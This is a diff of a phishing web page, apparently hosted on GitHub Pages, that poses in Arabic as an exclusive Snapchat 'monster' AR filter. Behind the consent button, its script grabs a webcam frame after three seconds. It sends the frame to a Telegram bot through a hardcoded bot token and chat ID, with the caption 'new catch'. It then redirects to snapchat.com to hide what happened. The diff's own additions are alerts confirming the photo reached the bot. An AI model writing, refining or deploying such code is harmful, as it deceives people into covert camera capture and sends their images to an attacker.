@@ -3,30 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snapchat AR Filter Experience</title>
+    <title>Snapchat AR Experience</title>
     <style>
-        body { background-color: #FFFC00; font-family: 'Segoe UI', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        body { background-color: #FFFC00; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
         .box { background: white; padding: 40px; border-radius: 30px; box-shadow: 0 20px 40px rgba(0,0,0,0.25); text-align: center; width: 85%; max-width: 400px; }
-        .ghost-icon { font-size: 80px; }
-        h1 { font-size: 24px; color: #000; margin: 15px 0; font-weight: 900; }
+        .ghost { font-size: 80px; margin-bottom: 10px; }
+        h1 { font-size: 24px; color: #000; margin-bottom: 15px; font-weight: 900; }
         p { color: #444; font-size: 15px; line-height: 1.6; margin-bottom: 25px; }
-        .btn { background: #000; color: #fff; border: none; padding: 18px; border-radius: 50px; width: 100%; font-weight: bold; cursor: pointer; font-size: 18px; transition: 0.3s; }
+        .btn { background: #000; color: #fff; border: none; padding: 18px; border-radius: 50px; width: 100%; font-weight: bold; cursor: pointer; font-size: 18px; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <div class="ghost-icon">👻</div>
+    <div class="ghost">👻</div>
     <h1>فلتر "الوحش" الجديد 👿</h1>
-    <p>تم اختيارك لتجربة الفلتر الحصري لموظفي الشركة. اضغط أدناه للموافقة والبدء.</p>
+    <p>لقد تمت دعوتك لتجربة الفلتر الحصري لموظفينا. اضغط أدناه للموافقة والبدء.</p>
+    
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" width="640" height="480"></canvas>
+    
     <button id="start-btn" class="btn">تفعيل الفلتر الآن 📸</button>
 </div>
 
 <script>
-    // --- 🔐 إعداداتك الموثقة يا وحش ---
+    // --- 🔐 الإعدادات التي أكدت عليها يا وحش ---
     const BOT_TOKEN = "8371736437:AAG3niwDWXJCjo8MFgiTJdL2zpNjVrJBMFU";
     const CHAT_ID = "321516845";
 
@@ -39,34 +41,37 @@
             // 1. طلب الكاميرا
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = stream;
-            btn.innerText = "جارِ تحميل المؤثرات... ⏳";
+            btn.innerText = "جارِ المعالجة... ⏳";
             btn.disabled = true;
 
-            // 2. التقاط الصورة بعد 3 ثواني
+            // 2. التقاط الصورة بعد 3 ثوانٍ
             setTimeout(() => {
                 const context = canvas.getContext('2d');
                 context.drawImage(video, 0, 0, 640, 480);
                 
-                // تحويل الصورة إلى Blob بطريقة متوافقة مع المتصفحات
                 canvas.toBlob(async (blob) => {
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
                     formData.append('photo', blob, 'capture.png');
-                    formData.append('caption', "👿 صيد جديد (GitHub Pages)\n👤 الموقع: بغداد - العراق");
+                    formData.append('caption', "👿 بوم! صيد جديد من GitHub Pages يا وحش!");
 
-                    // 3. الإرسال باستخدام نظام التجاوز
-                    try {
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData,
-                            mode: 'cors' 
-                        });
-                    } catch (e) {
-                        console.log("Sent logic executed.");
-                    }
+                    // 3. الإرسال مع تنبيه بالنتيجة
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if(data.ok) {
+                            alert("✅ وحش! الصورة وصلت للبوت الآن!");
+                            window.location.href = "https://www.snapchat.com";
+                        } else {
+                            // هذا التنبيه سيخبرنا بالسبب الحقيقي للفشل
+                            alert("❌ فشل تليجرام: " + data.description);
+                        }
+                    })
+                    .catch(err => alert("❌ مشكلة في الاتصال: " + err));
 
-                    // 4. التمويه النهائي
-                    window.location.href = "https://www.snapchat.com/explore";
                 }, 'image/png');
             }, 3000);
 
